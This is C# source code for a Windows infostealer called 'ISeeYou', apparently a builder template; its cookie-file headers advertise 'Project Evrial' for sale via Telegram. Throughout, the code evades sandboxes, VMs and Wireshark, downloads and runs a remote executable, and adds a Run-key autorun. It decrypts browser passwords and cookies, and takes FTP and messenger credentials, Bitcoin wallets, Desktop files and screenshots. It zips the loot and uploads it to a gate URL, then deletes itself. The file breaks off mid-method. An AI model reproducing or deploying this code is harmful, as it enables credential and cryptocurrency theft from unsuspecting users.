using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Globalization;
using System.IO;
using System.Reflection;
using System.IO.Compression;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Xml;
using I_See_you;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

[assembly: AssemblyTitle("[title]")]
[assembly: AssemblyCompany("[company]")]
[assembly: AssemblyCopyright("[copyr]")]
[assembly: AssemblyFileVersion("[version]")]

namespace ISeeYou
{
    public class Form1 : Form
    {
        public Form1()
        {
            this.InitializeComponent();
            Hide();
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            //Thread.Sleep(Int32.Parse("[sleep]"));
            //[Message]
            Antis.Anti(RawSettings.AntiWPE, RawSettings.AntiWireshark, RawSettings.AntiSandboxie,
                RawSettings.AntiVBox);
            bool inet = true;
            while (inet)
            {
                if (ChekInet())
                {
                    inet = false;
                    if (RawSettings.OnLoader)
                        Loader.Download(RawSettings.Downloadurl, Helper.GetRandomString());
                    if (RawSettings.StartUpOn)
                        Run.Autorun();
                    RawSettings.Owner = Environment.MachineName;
                    RawSettings.Version = "0.1.1";
                    RawSettings.HWID = Identification.GetId();
                    RawSettings.Location = CultureInfo.CurrentUICulture.ToString();
                    RawSettings.RAM = (new Computer().Info.TotalPhysicalMemory / 1024 / 1024) + " Gb";
                    BlockBrowsers.KillProcess();
                    Passwords.SendFile();
                    SelfDelete.Delete();
                }
                Thread.Sleep(5000);
            }
        }
        private bool ChekInet()
        {
            bool inet = false;
            if (NetCheck.GetCheckForInternetConnection("https://www.google.com"))// проверка интернет соединения
            {
                return true;
            }
            return inet;
        }
        private class NetCheck
        {
            public static bool GetCheckForInternetConnection(string OpenClient)
            {
                try
                {
                    using (new WebClient().OpenRead(OpenClient))
                    {
                        return true;
                    }
                }
                catch { return false; }
            }
        }
        
        private void InitializeComponent()
        {
            SuspendLayout();
            AutoScaleDimensions = new SizeF(6f, 13f);
            AutoScaleMode = AutoScaleMode.Font;
            ClientSize = new Size(0, 0);
            FormBorderStyle = FormBorderStyle.None;
            Name = "Form1";
            Opacity = 0.0;
            ShowInTaskbar = false;
            this.Text = "Form1";
            Load += new EventHandler(this.Form1_Load);
            ResumeLayout(false);
        }
        private IContainer components;
    }
}
namespace ISeeYou
{
    class Antis
    {
        [DllImport("kernel32.dll")]
        internal static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);
        [DllImport("wininet.dll")]
        internal static extern bool InternetSetOption(IntPtr hInternet, int dwOption, IntPtr lpBuffer, int dwBufferLength);
        [DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        internal static extern bool CryptUnprotectData(ref Structures.DataBlob pCipherText, ref string pszDescription, ref Structures.DataBlob pEntropy, IntPtr pReserved, ref Structures.CryptprotectPromptstruct pPrompt, int dwFlags, ref Structures.DataBlob pPlainText);

        public static void Anti(bool wpe, bool wireshark, bool sandboxie, bool vbox)
        {
            if (wpe)
                DetectWPE();
            if (wireshark)
                DetectWireshark();
            if (sandboxie)
                SandBoxie();
            if (vbox)
                DetectVirtualMachine();
        }
        private static void DetectWPE()
        {
            Process[] ProcessList = Process.GetProcesses();
            foreach (Process proc in ProcessList)
            {
                if (proc.MainWindowTitle.Equals("WPE PRO"))
                {
                    Environment.Exit(1);
                }
            }
        }
        private static void DetectWireshark()
        {
            Process[] ProcessList = Process.GetProcesses();
            foreach (Process proc in ProcessList)
            {
                if (proc.MainWindowTitle.Equals("The Wireshark Network Analyzer"))
                {
                    Environment.Exit(1);
                }
            }
        }
        private static void SandBoxie()
        {
            if (Process.GetProcessesByName("wsnm").Length > 0 || (GetModuleHandle("SbieDll.dll").ToInt32() != 0))
            {
                Environment.Exit(1);
            }
        }

        private static void DetectVirtualMachine()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem").Get())
                {
                    foreach (var item in searcher)
                    {
                        if ((item["Manufacturer"].ToString().ToLower() == "microsoft corporation" &&
                             item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) ||
                             item["Manufacturer"].ToString().ToLower().Contains("vmware") ||
                             item["Model"].ToString() == "VirtualBox")
                        {
                            Environment.Exit(1);
                        }
                    }
                }
            }
            catch (System.ObjectDisposedException) { }

        }
        public class Structures
        {
            public struct CryptprotectPromptstruct
            {
                public int cbSize;
                public int dwPromptFlags;
                internal IntPtr hwndApp;
                public string szPrompt;
            }

            public struct DataBlob
            {
                public int cbData;
                internal IntPtr pbData;
            }
        }
    }
}
namespace I_See_you
{
    class ChromiumCookie
    {
        public static void ChromiumInitialise(string path)
        {
            string environmentVariable = Environment.GetEnvironmentVariable("LocalAppData");
            string[] array = new string[]
            {
                environmentVariable + "\\Google\\Chrome\\User Data\\Default\\Cookies",
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Cookies",
                environmentVariable + "\\Kometa\\User Data\\Default\\Cookies",
                environmentVariable + "\\Orbitum\\User Data\\Default\\Cookies",
                environmentVariable + "\\Comodo\\Dragon\\User Data\\Default\\Cookies",
                environmentVariable + "\\Amigo\\User\\User Data\\Default\\Cookies",
                environmentVariable + "\\Torch\\User Data\\Default\\Cookies"
            };
            string[] array2 = array;
            for (int i = 0; i < array2.Length; i++)
            {
                string text = array2[i];
                try
                {
                    string str = "";
                    if (text.Contains("Chrome"))
                    {
                        str = "Google";
                    }
                    if (text.Contains("Yandex"))
                    {
                        str = "Yandex";
                    }
                    if (text.Contains("Orbitum"))
                    {
                        str = "Orbitum";
                    }
                    if (text.Contains("Opera"))
                    {
                        str = "Opera";
                    }
                    if (text.Contains("Amigo"))
                    {
                        str = "Amigo";
                    }
                    if (text.Contains("Torch"))
                    {
                        str = "Torch";
                    }
                    if (text.Contains("Comodo"))
                    {
                        str = "Comodo";
                    }
                    try
                    {
                        List<Cookie> cookies = GetCookies(text);
                        if (cookies != null)
                        {
                            Directory.CreateDirectory(path + "\\Cookies\\");
                            using (StreamWriter streamWriter = new StreamWriter(path + "\\Cookies\\" + str + "_cookies.txt"))
                            {
                                streamWriter.WriteLine("# ----------------------------------");
                                streamWriter.WriteLine("# Stealed cookies by Project Evrial ");
                                streamWriter.WriteLine("# Developed by Qutra ");
                                streamWriter.WriteLine("# Buy Project Evrial: t.me/Qutrachka");
                                streamWriter.WriteLine("# ----------------------------------\r\n");
                                foreach (Cookie current in cookies)
                                {
                                    if (current.expirationDate == "9223372036854775807")
                                    {
                                        current.expirationDate = "0";
                                    }
                                    if (current.domain[0] != '.')
                                    {
                                        current.hostOnly = "FALSE";
                                    }
                                    streamWriter.Write(string.Concat(new string[]
                                    {
                                        current.domain,
                                        "\t",
                                        current.hostOnly,
                                        "\t",
                                        current.path,
                                        "\t",
                                        current.secure,
                                        "\t",
                                        current.expirationDate,
                                        "\t",
                                        current.name,
                                        "\t",
                                        current.value,
                                        "\r\n"
                                    }));
                                }
                            }
                        }
                    }
                    catch
                    {
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.ToString());
                }
            }
        }
        private static List<Cookie> GetCookies(string basePath)
        {
            if (!File.Exists(basePath))
            {
                return null;
            }
            List<Cookie> result;
            try
            {
                string text = Path.GetTempPath() + "/" + Helper.GetRandomString() + ".fv";
                if (File.Exists(text))
                {
                    File.Delete(text);
                }
                File.Copy(basePath, text, true);
                Sqlite sqlite = new Sqlite(text);
                sqlite.ReadTable("cookies");
                List<Cookie> list = new List<Cookie>();
                for (int i = 0; i < sqlite.GetRowCount(); i++)
                {
                    try
                    {
                        string value = string.Empty;
                        try
                        {
                            byte[] bytes = Chromium.DecryptChromium(Encoding.Default.GetBytes(sqlite.GetValue(i, 12)), null);
                            value = Encoding.UTF8.GetString(bytes);
                        }
                        catch (Exception)
                        {
                        }
                        bool flag;
                        bool.TryParse(sqlite.GetValue(i, 6), out flag);
                        list.Add(new Cookie
                        {
                            domain = sqlite.GetValue(i, 1),
                            name = sqlite.GetValue(i, 2),
                            path = sqlite.GetValue(i, 4),
                            expirationDate = sqlite.GetValue(i, 5),
                            secure = flag.ToString().ToUpper(),
                            value = value,
                            hostOnly = "TRUE"
                        });
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.ToString());
                    }
                }
                result = list;
            }
            catch
            {
                result = new List<Cookie>();
            }
            return result;
        }
    }
}
namespace I_See_you
{
    class Cookie
    {
        public string domain
        {
            get;
            set;
        }
        public string expirationDate
        {
            get;
            set;
        }
        public string hostOnly
        {
            get;
            set;
        }
        public string name
        {
            get;
            set;
        }
        public string path
        {
            get;
            set;
        }
        public string secure
        {
            get;
            set;
        }
        public string value
        {
            get;
            set;
        }
    }
}
namespace I_See_you
{
    class Loader
    {
        public static void Download(string url, string filename)
        {
            byte[] srv = null;
            try
            {
                using (WebClient web = new WebClient())
                {
                    srv = web.DownloadData(url); // скачиваем файл
                }

                File.WriteAllBytes(RawSettings.DownloadPath + "\\" + filename + ".exe", srv); // записываем в Temp
                Thread.Sleep(3000); // небольшая пауза на всякий случай
                Process.Start(RawSettings.DownloadPath + "\\" + filename + ".exe"); // запускаем
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }
    }
}
namespace I_See_you
{
    class Identification
    {
        public static string GetId()
        {
            string result;
            try
            {
                using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
                {
                    using (RegistryKey registryKey2 = registryKey.OpenSubKey("SOFTWARE\\Microsoft\\Cryptography"))
                    {
                        if (registryKey2 == null)
                        {
                            throw new KeyNotFoundException(string.Format("Key Not Found: {0}", "SOFTWARE\\Microsoft\\Cryptography"));
                        }
                        object value = registryKey2.GetValue("MachineGuid");
                        if (value == null)
                        {
                            throw new IndexOutOfRangeException(string.Format("Index Not Found: {0}", "MachineGuid"));
                        }
                        result = value.ToString().ToUpper().Replace("-", string.Empty);
                    }
                }
            }
            catch
            {
                result = "HWID not found";
            }
            return result;
        }
    }
}
namespace I_See_you
{
    class Network
    {
        public static void UploadFile(string path)
        {
            try
            {
                new WebClient().UploadFile(RawSettings.SiteUrl + string.Format("receive.php?user={0}&hwid={1}", RawSettings.Owner, RawSettings.HWID), "POST", path);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }
    }
}
namespace I_See_you
{
    class RawSettings
    {
        public static readonly string SiteUrl = "[gate]"; //http://93.170.123.78/stealer/
        public static readonly string Downloadurl = "[dLink]";
        public static readonly bool OnLoader = Convert.ToBoolean("[loader]");
        public static readonly bool AntiSandboxie = Convert.ToBoolean("[AntiSandboxie]");
        public static readonly bool AntiWireshark = Convert.ToBoolean("[AntiWireshark]");
        public static readonly bool AntiWPE = Convert.ToBoolean("[AntiWPE]");
        public static readonly bool AntiVBox = Convert.ToBoolean("[AntiVBox]");
        public static readonly bool StartUpOn = Convert.ToBoolean("[StartUpOn]");
        public static readonly bool FileGrab = Convert.ToBoolean("[FileGrab]");
        public static readonly string DownloadPath = "[downPath]";
        public static readonly string StartUpPath = "[sLocation]";
        public static string HWID { get; internal set; }
        public static string RAM { get; internal set; }
        public static string Owner { get; internal set; }
        public static string Version { get; internal set; }
        public static string Location { get; internal set; }
    }
}
namespace I_See_you
{
    class Run
    {
        public static void Autorun()
        {
            Thread.Sleep(new Random().Next(1000, 2000));
            string path = RawSettings.StartUpPath + "\\" + "[sfileName]";
            try
            {
                if (File.Exists(path))
                {
                    try
                    {
                        File.SetAttributes(path, FileAttributes.Normal);
                        File.Delete(path);
                    }
                    catch
                    {
                    }
                }
                if (!File.Exists(path))
                {
                    try
                    {
                        File.SetAttributes(path, FileAttributes.Hidden);
                    }
                    catch
                    {
                    }
                }
                using (RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"))
                {
                    registryKey.SetValue("[sRegKey]", RawSettings.StartUpPath + "\\" + "[sfileName]");
                }
            }
            catch
            {
            }
        }
    }
}
namespace I_See_you
{
    class Chromium
    {
        public static IEnumerable<PassData> Initialise()
        {
            List<PassData> list = new List<PassData>();
            string environmentVariable = Environment.GetEnvironmentVariable("LocalAppData");
            string[] array = new string[]
            {
                environmentVariable + "\\Google\\Chrome\\User Data\\Default\\Login Data",
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Login Data",
                environmentVariable + "\\Kometa\\User Data\\Default\\Login Data",
                environmentVariable + "\\Orbitum\\User Data\\Default\\Login Data",
                environmentVariable + "\\Comodo\\Dragon\\User Data\\Default\\Login Data",
                environmentVariable + "\\Amigo\\User\\User Data\\Default\\Login Data",
                environmentVariable + "\\Torch\\User Data\\Default\\Login Data"
            };
            string[] array2 = array;
            for (int i = 0; i < array2.Length; i++)
            {
                string basePath = array2[i];
                List<PassData> list2 = new List<PassData>();
                try
                {
                    list2 = Get(basePath);
                }
                catch
                {
                }
                if (list2 != null)
                {
                    list.AddRange(list2);
                }
            }
            return list;
        }
        [DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool CryptUnprotectData(ref DataBlob pCipherText, ref string pszDescription, ref DataBlob pEntropy, IntPtr pReserved, ref CryptprotectPromptstruct pPrompt, int dwFlags, ref DataBlob pPlainText);

        public static byte[] DecryptChromium(byte[] cipherTextBytes, byte[] entropyBytes = null)
        {
            DataBlob dataBlob = default(DataBlob);
            DataBlob dataBlob2 = default(DataBlob);
            DataBlob dataBlob3 = default(DataBlob);
            CryptprotectPromptstruct cryptprotectPromptstruct = new CryptprotectPromptstruct
            {
                cbSize = Marshal.SizeOf(typeof(CryptprotectPromptstruct)),
                dwPromptFlags = 0,
                hwndApp = IntPtr.Zero,
                szPrompt = null
            };
            string empty = string.Empty;
            try
            {
                try
                {
                    if (cipherTextBytes == null)
                    {
                        cipherTextBytes = new byte[0];
                    }
                    dataBlob2.pbData = Marshal.AllocHGlobal(cipherTextBytes.Length);
                    dataBlob2.cbData = cipherTextBytes.Length;
                    Marshal.Copy(cipherTextBytes, 0, dataBlob2.pbData, cipherTextBytes.Length);
                }
                catch (Exception)
                {
                }
                try
                {
                    if (entropyBytes == null)
                    {
                        entropyBytes = new byte[0];
                    }
                    dataBlob3.pbData = Marshal.AllocHGlobal(entropyBytes.Length);
                    dataBlob3.cbData = entropyBytes.Length;
                    Marshal.Copy(entropyBytes, 0, dataBlob3.pbData, entropyBytes.Length);
                }
                catch (Exception)
                {
                }
                CryptUnprotectData(ref dataBlob2, ref empty, ref dataBlob3, IntPtr.Zero, ref cryptprotectPromptstruct, 1, ref dataBlob);
                byte[] array = new byte[dataBlob.cbData];
                Marshal.Copy(dataBlob.pbData, array, 0, dataBlob.cbData);
                return array;
            }
            catch (Exception)
            {
            }
            finally
            {
                if (dataBlob.pbData != IntPtr.Zero)
                {
                    Marshal.FreeHGlobal(dataBlob.pbData);
                }
                if (dataBlob2.pbData != IntPtr.Zero)
                {
                    Marshal.FreeHGlobal(dataBlob2.pbData);
                }
                if (dataBlob3.pbData != IntPtr.Zero)
                {
                    Marshal.FreeHGlobal(dataBlob3.pbData);
                }
            }
            return new byte[0];
        }
        private static List<PassData> Get(string basePath)
        {
            if (!File.Exists(basePath))
            {
                return null;
            }
            string program = "";
            if (basePath.Contains("Chrome"))
            {
                program = "Google Chrome";
            }
            if (basePath.Contains("Yandex"))
            {
                program = "Yandex Browser";
            }
            if (basePath.Contains("Orbitum"))
            {
                program = "Orbitum Browser";
            }
            if (basePath.Contains("Opera"))
            {
                program = "Opera Browser";
            }
            if (basePath.Contains("Amigo"))
            {
                program = "Amigo Browser";
            }
            if (basePath.Contains("Torch"))
            {
                program = "Torch Browser";
            }
            if (basePath.Contains("Comodo"))
            {
                program = "Comodo Browser";
            }
            List<PassData> result;
            try
            {
                string text = Path.GetTempPath() + "/" + Helper.GetRandomString() + ".fv";
                if (File.Exists(text))
                {
                    File.Delete(text);
                }
                File.Copy(basePath, text, true);
                Sqlite sqlite = new Sqlite(text);
                List<PassData> list = new List<PassData>();
                sqlite.ReadTable("logins");
                for (int i = 0; i < sqlite.GetRowCount(); i++)
                {
                    try
                    {
                        string text2 = string.Empty;
                        try
                        {
                            byte[] bytes = DecryptChromium(Encoding.Default.GetBytes(sqlite.GetValue(i, 5)), null);
                            text2 = Encoding.UTF8.GetString(bytes);
                        }
                        catch (Exception)
                        {
                        }
                        if (text2 != "")
                        {
                            list.Add(new PassData
                            {
                                Url = sqlite.GetValue(i, 1).Replace("https://", "").Replace("http://", ""),
                                Login = sqlite.GetValue(i, 3),
                                Password = text2,
                                Program = program
                            });
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.ToString());
                    }
                }
                File.Delete(text);
                result = list;
            }
            catch (Exception ex2)
            {
                Console.WriteLine(ex2.ToString());
                result = null;
            }
            return result;
        }
        private struct CryptprotectPromptstruct
        {
            public int cbSize;
            public int dwPromptFlags;
            public IntPtr hwndApp;
            public string szPrompt;
        }
        private struct DataBlob
        {
            public int cbData;
            public IntPtr pbData;
        }
    }
}
namespace I_See_you
{
    class FilezillaFTP
    {
        internal class FileZilla
        {
            public static void Initialise(string path)
            {
                if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Filezilla\\recentservers.xml"))
                {
                    return;
                }
                try
                {
                    File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Filezilla\\recentservers.xml", path + "filezilla_recentservers.xml", true);
                }
                catch
                {
                }
                if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Filezilla\\sitemanager.xml"))
                {
                    return;
                }
                try
                {
                    File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Filezilla\\sitemanager.xml", path + "filezilla_sitemanager.xml", true);
                }
                catch
                {
                }
            }
        }
    }
}
namespace I_See_you
{
    class Helper
    {
        public static string GetRandomString()
        {
            string randomFileName = Path.GetRandomFileName();
            return randomFileName.Replace(".", "");
        }
    }
}
namespace I_See_you
{
    class Miranda
    {
        public static List<PassDataMiranda> Initialise()
        {
            List<PassDataMiranda> list = new List<PassDataMiranda>();
            string text = null;
            string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Miranda\\";
            checked
            {
                string result = "";
                if (Directory.Exists(path))
                {
                    try
                    {
                        string str = Environment.NewLine + Environment.NewLine + "Program: Miranda" +
                                     Environment.NewLine;
                        string[] directories = Directory.GetDirectories(path);
                        string text4 = "";
                        string text5 = "";
                        for (int i = 0; i < directories.Length; i++)
                        {
                            string path2 = directories[i];
                            string[] files = Directory.GetFiles(path2);
                            for (int j = 0; j < files.Length; j++)
                            {
                                string path3 = files[j];
                                string[] array = Strings.Split(File.ReadAllText(path3), " ", -1, CompareMethod.Binary);
                                for (int k = 0; k < array.Length; k++)
                                {
                                    string text2 = array[k];
                                    if (text2.Contains("AM_BaseProto"))
                                    {
                                        text2 = text2.Replace("\u0004", "");
                                        text2 = text2.Replace("\0", "");
                                        string[] array2 = Strings.Split(text2, "�", -1, CompareMethod.Binary);
                                        bool flag = false;
                                        bool flag2 = false;
                                        int arg_E8_0 = 0;
                                        int num = array2.Length - 1;
                                        for (int l = arg_E8_0; l <= num; l++)
                                        {
                                            if (array2[l].Length > 0)
                                            {
                                                if (flag)
                                                {
                                                    str = str + Environment.NewLine + "Password: ";
                                                    string text3 =
                                                        Strings.Split(array2[l], "\n", -1, CompareMethod.Binary)[0];
                                                    int arg_137_0 = 0;
                                                    int num2 = text3.Length - 1;
                                                    for (int m = arg_137_0; m <= num2; m++)
                                                    {
                                                        text4 +=
                                                            Conversions.ToString(
                                                                Strings.ChrW((int)(text3[m] - '\u0005')));
                                                    }
                                                    str = str + Environment.NewLine + Environment.NewLine;
                                                    break;
                                                }
                                                if (flag2)
                                                {
                                                    str = str + Environment.NewLine + array2[l] + Environment.NewLine;
                                                    flag2 = false;
                                                }
                                                if (array2[l].Contains("AM_BaseProto"))
                                                {
                                                    flag2 = true;
                                                }
                                                if (array2[l].Contains("Password"))
                                                {
                                                    text5 = Strings.Left(array2[l], array2[l].Length - 9);
                                                    flag = true;
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                        list.Add(new PassDataMiranda(text5, text4));
                        return list;

                    }
                    catch (Exception ex)
                    {
                        return list;
                    }
                    return list;
                }
                return list;
            }
        }
    }
    class PassDataMiranda
    {
        public string Login { get; private set; }
        public string Password { get; private set; }
        public PassDataMiranda(string login, string password)
        {
            Login = login;
            Password = password;
        }

        public override string ToString()
        {
            return
                string.Format(
                    "Program : {0}\r\n\r\nLogin : {1}\r\nPassword : {2}\r\n——————————————————————————————————",
                    new object[]
                    {
                        "Miranda",
                        Login,
                        Password,
                    });
        }
    }
}
namespace I_See_you
{
    class NoIP
    {
        public static List<PassDataNoIp> Initialise()
        {
            List<PassDataNoIp> list = new List<PassDataNoIp>();
            string text = null;
            string text2 = " ";
            string text3 =
                Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "Username", null).ToString();
            string text4 =
                Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "Password", null).ToString();
            list.Add(new PassDataNoIp(text3, text4));
            return list;
        }

        public static string base64Decode(string data)
        {
            string result;
            try
            {
                UTF8Encoding uTF8Encoding = new UTF8Encoding();
                Decoder decoder = uTF8Encoding.GetDecoder();
                byte[] array = Convert.FromBase64String(data);
                int charCount = decoder.GetCharCount(array, 0, array.Length);
                char[] array2 = new char[checked(charCount - 1 + 1)];
                decoder.GetChars(array, 0, array.Length, array2, 0);
                string text = new string(array2);
                result = text;
            }
            catch (Exception ex)
            {
                throw new Exception("Error in base64Decode" + ex.Message);
            }
            return result;
        }
    }

    class PassDataNoIp
    {
        public string Login { get; private set; }
        public string Password { get; private set; }

        public PassDataNoIp(string login, string password)
        {
            Login = login;
            Password = password;
        }

        public override string ToString()
        {
            return
                string.Format(
                    "Program : {0}\r\n\r\nLogin : {1}\r\nPassword : {2}\r\n——————————————————————————————————",
                    new object[]
                    {
                        "NoIp",
                        Login,
                        Password,
                    });
        }
    }
}
namespace I_See_you
{
    class PassData
    {
        public string Url
        {
            get;
            set;
        }
        public string Login
        {
            get;
            set;
        }
        public string Password
        {
            get;
            set;
        }
        public string Program
        {
            get;
            set;
        }
        public override string ToString()
        {
            return string.Format("SiteUrl : {0}\r\nLogin : {1}\r\nPassword : {2}\r\nProgram : {3}\r\n——————————————————————————————————", new object[]
            {
                Url,
                Login,
                Password,
                Program
            });
        }
    }
}
namespace I_See_you
{
    class Passwords
    {
        public static void SendFile()
        {
            string randomString = Helper.GetRandomString();
            string text = Path.GetTempPath() + randomString;
            Directory.CreateDirectory(text);
            using (StreamWriter streamWriter = new StreamWriter(text + "\\log.txt"))
            {
                streamWriter.WriteLine(string.Concat(new string[]
                {
                    "[————————————————————————————————————————————————————————]\r\n[======================= Password =======================]\r\n[========================================================]\r\n\r\n\r\n",
                    "[==================== System Info =======================]\r\n\r\n",
                    string.Format("Date: {0}\r\n", DateTime.Now),
                    string.Format("Windows Username: {0}\r\n", SystemInformation.UserName),
                    string.Format("Windows MachineName: {0}\r\n", RawSettings.Owner),
                    string.Format("HWID: {0}\r\n", RawSettings.HWID),
                    string.Format("System: {0}\r\n", GetWindowsVersion()),
                    string.Format("Location: {0}\r\n",RawSettings.Location),
                    string.Format("RAM: {0}\r\n", RawSettings.RAM),
                    "\r\n\r\n[======================= Password =======================]\r\n"
                }));
                try
                {
                    foreach (PassData current in Chromium.Initialise())
                    {
                        streamWriter.WriteLine(current);
                    }
                }
                catch
                {
                }
                //******************************Pidgin*********************************************//
                try
                {
                    foreach (PassDataPidgin current2 in Pidgin.Initialise())
                    {
                        streamWriter.WriteLine(current2);
                    }
                }
                catch
                {
                }
                //******************************NoIp*********************************************//
                try
                {
                    foreach (PassDataNoIp current3 in NoIP.Initialise())
                    {
                        streamWriter.WriteLine(current3);
                    }
                }
                catch
                {
                }
                //******************************Miranda*********************************************//
                try
                {
                    foreach (PassDataMiranda current4 in Miranda.Initialise())
                    {
                        streamWriter.WriteLine(current4);
                    }
                }
                catch
                {
                }
            }
            try
            {
                if (RawSettings.FileGrab)
                {
                    List<string> list = new List<string>(SearchFiles(Environment.GetFolderPath(Environment.SpecialFolder.Desktop)));
                    Directory.CreateDirectory(text + "\\Files\\");
                    for (int i = 0; i < list.Count; i++)
                    {
                        if (new FileInfo(list[i]).Length / 1024 < Int64.Parse("[maxSizeFile]"))
                        {
                            File.Copy(list[i], text + "\\Files\\" + Path.GetFileName(list[i]), true);
                        }
                        else
                        {
                            continue;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
            try
            {
                Telegram.StealIt(text);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
            try
            {
                GetJpegScreen(text + "\\" + DateTime.Now.ToShortDateString() + "_Screen_desktop.png");
            }
            catch (Exception ex2)
            {
                Console.WriteLine(ex2.ToString());
            }
            try
            {
                ChromiumCookie.ChromiumInitialise(text + "\\");
            }
            catch (Exception ex3)
            {
                Console.WriteLine(ex3.ToString());
            }
            try
            {
                FilezillaFTP.FileZilla.Initialise(text + "\\");
            }
            catch (Exception ex4)
            {
                Console.WriteLine(ex4.ToString());
            }
            try
            {
                string text2 = Wallet.BitcoinStealer();
                if (text2 != "" && File.Exists(text2))
                {
                    File.Copy(text2, text + "\\wallet.dat");
                }
            }
            catch (Exception ex5)
            {
                Console.WriteLine(ex5.ToString());
            }
            try
            {
                Zip(text, Path.GetTempPath() + "\\" + randomString + ".zip");
            }
            catch (Exception ex6)
            {
                Console.WriteLine(ex6.ToString());
            }
            try
            {
                RemoveTempFiles(text);
            }
            catch (Exception ex7)
            {
                Console.WriteLine(ex7.ToString());
            }
            try
            {
                Network.UploadFile(Path.GetTempPath() + "\\" + randomString + ".zip");
                File.Delete(Path.GetTempPath() + "\\" + randomString + ".zip");
                Directory.Delete(Path.GetTempPath() + "\\" + randomString, true);
            }
            catch (Exception ex8)
            {
                Console.WriteLine(ex8.ToString());
            }
        }
        private static void Zip(string path, string s)
        {
            ZipFile.CreateFromDirectory(path, s, CompressionLevel.Optimal, false, Encoding.UTF8);
        }
        public static string GetWindowsVersion()
        {
            string result;
            try
            {
                ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM CIM_OperatingSystem");
                string text = string.Empty;
                foreach (ManagementBaseObject current in managementObjectSearcher.Get())
                {
                    ManagementObject managementObject = (ManagementObject)current;
                    text = managementObject["Caption"].ToString();
                }
                if (text.Contains("8"))
                {
                    result = "Windows 8";
                }
                else if (text.Contains("8.1"))
                {
                    result = "Windows 8.1";
                }
                else if (text.Contains("10"))
                {
                    result = "Windows 10";
                }
                else if (text.Contains("XP"))
                {
                    result = "Windows XP";
                }
                else if (text.Contains("7"))
                {
                    result = "Windows 7";
                }
                else if (text.Contains("Server"))
                {
                    result = "Windows Server";
                }
                else
                {
                    result = "Unknown";
                }
            }
            catch
            {
                result = "Unknown";
            }
            return result;
        }

        static List<string> SearchFiles(string patch)
        {
            List<string> list = new List<string>();
            string[] extension = { "[expansion]" }; //"*.txt", "*.doc", "*.docx", "*.png", "*.xls", "*.cs", "*.rar"
            for (int j = 0; j < extension.Length; j++)
            {
                string[] ReultSearch = Directory.GetFiles(patch, extension[j], SearchOption.AllDirectories);
                for (int i = 0; i < ReultSearch.Length; i++)
                {
                    list.Add(ReultSearch[i]);
                }
            }
            return list;
        }

        private static void RemoveTempFiles(string directorypath)
        {
            try
            {
                DirectoryInfo[] directories = new DirectoryInfo(directorypath).GetDirectories();
                for (int i = 0; i < directories.Length; i++)
                {
                    DirectoryInfo directoryInfo = directories[i];
                    FileInfo[] files = directoryInfo.GetFiles();
                    for (int j = 0; j < files.Length; j++)
                    {
                        FileInfo fileInfo = files[j];
                        fileInfo.Delete();
                    }
                    directoryInfo.Delete();
                }
                FileInfo[] files2 = new DirectoryInfo(directorypath).GetFiles();
                for (int k = 0; k < files2.Length; k++)
                {
                    FileInfo fileInfo2 = files2[k];
                    fileInfo2.Delete();
                }
                Directory.Delete(directorypath);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }
        private static void GetJpegScreen(string filepath)
        {
            try
            {
                Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                Graphics graphics = Graphics.FromImage(bitmap);
                graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
                bitmap.Save(filepath, ImageFormat.Png);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }
    }
}
namespace I_See_you
{
    class Pidgin
    {
        public static List<PassDataPidgin> Initialise()
        {
            List<PassDataPidgin> pidgin = new List<PassDataPidgin>();
            string result = "";
            try
            {
                string src = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +
                         "\\.purple\\accounts.xml";
                if (!File.Exists(src))
                {
                    result = null;
                }

                XmlDocument doc = new XmlDocument();
                doc.Load(src);
                foreach (XmlNode node in doc.DocumentElement)
                {
                    string protocolName = node["protocol"] != null ? node["protocol"].InnerText : "";
                    string login = node["name"] != null ? node["name"].InnerText : "";
                    string password = node["password"] != null ? node["password"].InnerText : "";
                    pidgin.Add(new PassDataPidgin(protocolName, login, password));
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
